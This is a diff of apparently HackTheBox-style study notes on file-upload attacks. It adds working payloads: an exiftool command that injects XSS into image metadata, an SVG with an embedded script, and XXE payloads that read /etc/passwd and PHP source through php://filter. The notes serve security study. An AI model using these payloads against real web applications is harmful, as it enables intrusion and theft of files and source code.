@@ -7,7 +7,7 @@ One easy method to determine what language runs the web application is to visit 
 
 Several other techniques may help identify the technologies running the web application, like using the [Wappalyzer](https://www.wappalyzer.com/) extension, which is available for all major browsers. Once added to our browser, we can click its icon to view all technologies running the web application:
 
-![[Pasted image 20251013173409.png]]
+![](images/Pasted%20image%2020251013173409.png)
 
 # Whitelist Filters
 
@@ -75,3 +75,50 @@ Content-Type: image/jpeg
 
 ------WebKitFormBoundaryk8nV6IHO4X8lin32--
 ```
+
+# Limited File Uploads
+
+Certain file types, like `SVG`, `HTML`, `XML`, and even some image and document files, may allow us to introduce new vulnerabilities to the web application by uploading malicious versions of these files. This is why fuzzing allowed file extensions is an important exercise for any file upload attack. It enables us to explore what attacks may be achievable on the web server. So, let's explore some of these attacks.
+
+## XSS
+
+Many file types may allow us to introduce a `Stored XSS` vulnerability to the web application by uploading maliciously crafted versions of them.
+
+```bash
+$ exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' HTB.jpg
+$ exiftool HTB.jpg
+...SNIP...
+Comment                         :  "><img src=1 onerror=alert(window.origin)>
+```
+
+We can see that the `Comment` parameter was updated to our XSS payload. When the image's metadata is displayed, the XSS payload should be triggered, and the JavaScript code will be executed to carry the XSS attack. Furthermore, if we change the image's MIME-Type to `text/html`, some web applications may show it as an HTML document instead of an image, in which case the XSS payload would be triggered even if the metadata wasn't directly displayed.
+
+XSS attacks can also be carried with `SVG` images, along with several other attacks. `Scalable Vector Graphics (SVG)` images are XML-based, and they describe 2D vector graphics, which the browser renders into an image. For this reason, we can modify their XML data to include an XSS payload. For example, we can write the following to `HTB.svg`:
+
+```bash
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
+    <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
+    <script type="text/javascript">alert(window.origin);</script>
+</svg>
+```
+
+## XXE
+
+With SVG images, we can also include malicious XML data to leak the source code of the web application, and other internal documents within the server. The following example can be used for an SVG image that leaks the content of (`/etc/passwd`):
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<svg>&xxe;</svg>
+```
+
+To use XXE to read `source code` in PHP web applications, we can use the following payload in our SVG image:
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
+<svg>&xxe;</svg>
+```
+
